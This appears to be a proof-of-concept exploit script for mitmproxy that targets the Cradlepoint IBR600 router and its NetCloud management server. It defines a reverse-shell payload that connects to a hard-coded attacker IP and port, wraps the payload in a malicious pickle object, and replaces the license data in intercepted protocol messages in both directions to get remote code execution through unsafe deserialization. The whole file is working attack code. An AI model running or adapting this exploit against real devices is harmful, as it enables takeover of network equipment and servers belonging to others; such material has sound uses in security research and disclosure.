"""Simple mitmproxy script to get a reverse shell on the Cradlepoint IBR600 router or NetCloud server."""

import ast
import base64
import json
import logging
import pickle
import struct
import zlib

from mitmproxy.utils import strutils

_ATTACKER_IP = "192.168.0.254"
_ATTACKER_PORT = 5555
_ROUTER_PAYLOAD = [
    "/bin/sh",
    "-c",
    f'/usr/bin/cppython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{_ATTACKER_IP}",{_ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
]


class Reverse:
    def __reduce__(self):
        import subprocess

        return subprocess.Popen(_ROUTER_PAYLOAD, 0)


class StreamTranscoderV1:
    header_sof_magic = 194
    header_struct = struct.Struct("!BII")
    header_size = header_struct.size
    encoder = json.JSONEncoder(separators=(",", ":"))
    decoder = json.JSONDecoder()
    compression_levels = [(0, 0), (100, 1), (1000, 3), (10000, 6), (100000, 9)]

    def _calc_sof(self, *numbers):
        seed = sum(numbers) & 255
        return self.header_sof_magic ^ (seed ^ 255)

    def header_encode(self, size, cmd_id):
        sof = self._calc_sof(size, cmd_id)
        return self.header_struct.pack(sof, size, cmd_id)

    def header_decode(self, data):
        (sof_claim, size, cmd_id) = self.header_struct.unpack(data)
        sof_actual = self._calc_sof(size, cmd_id)
        if sof_claim != sof_actual:
            raise ValueError("Invalid start of frame byte.")
        return (size, cmd_id)

    def decode(self, data):
        compressed = data[0:1] == b"\x01"
        data = data[1:]
        if compressed:
            data = self.decompress(data)
        return self.decoder.decode(data.decode())

    def encode(self, obj):
        json_data = self.encoder.encode(obj).encode()
        size = len(json_data)
        level = max(
            (level for min_size, level in self.compression_levels if size >= min_size)
        )
        if level:
            return b"\x01" + self.compress(json_data, level)
        return b"\x00" + json_data

    def compress(self, data, level):
        return zlib.compress(data, level)

    def decompress(self, data):
        return zlib.decompress(data)


def tcp_message(flow):
    message = flow.messages[-1]
    transcoder = StreamTranscoderV1()

    try:
        msg_size, cmd_id = transcoder.header_decode(
            message.content[: transcoder.header_size]
        )
        message_str = transcoder.decode(message.content[transcoder.header_size :])
        message_decoded = ast.literal_eval(message_str)
        logging.info(
            "tcp_message[from_client=%s, content=%s]",
            message.from_client,
            message_str,
        )
    except Exception as general_exception:
        logging.info(
            "tcp_message[from_client=%s, content=%s]",
            message.from_client,
            strutils.bytes_to_escaped_str(message.content),
        )

    # Patch the license file from NetCloud -> Router
    if message_decoded and not message.from_client and cmd_id == 3:
        license = (
            message_decoded.get("data", {})
            .get("request", {})
            .get("options", {})
            .get("value")
        )

        if license:
            try:
                reverse_shell_payload = base64.b64encode(
                    pickle.dumps(Reverse())
                ).decode()
                message_decoded["data"]["request"]["options"][
                    "value"
                ] = reverse_shell_payload
                message_data = transcoder.encode(str(message_decoded))
                message_header = transcoder.header_encode(len(message_data), cmd_id)
                message_encoded = message_header + message_data
                message.content = message_encoded
            except Exception as general_exception:
                logging.info(
                    "[NetCloud -> Router] Could not patch pickled license payload! %s",
                    general_exception,
                )

    # Patch the license file from Router -> NetCloud
    if message_decoded and message.from_client and cmd_id == 18:
        license = message_decoded.get("args", {}).get("value", {}).get("data")

        if license:
            try:
                reverse_shell_payload = base64.b64encode(
                    pickle.dumps(Reverse())
                ).decode()
                message_decoded["args"]["value"]["data"] = reverse_shell_payload
                message_data = transcoder.encode(str(message_decoded))
                message_header = transcoder.header_encode(len(message_data), cmd_id)
                message_encoded = message_header + message_data
                message.content = message_encoded
            except Exception as general_exception:
                logging.info(
                    "[Router -> NetCloud] Could not patch pickled license payload! %s",
                    general_exception,
                )
